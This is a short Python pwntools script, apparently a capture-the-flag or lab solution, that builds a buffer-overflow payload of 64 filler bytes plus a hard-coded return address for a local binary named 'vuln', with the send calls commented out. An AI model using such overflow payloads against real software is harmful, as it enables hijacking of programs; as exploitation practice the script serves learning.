from pwn import *

# p = process("./vuln")
#
# p.sendline("L")
#
payload = "A" * 64 + "  "
payload += "\x08\x04\x87\xd6"
print(payload)

# p.sendline(payload)
#
# log.info(p.clean())
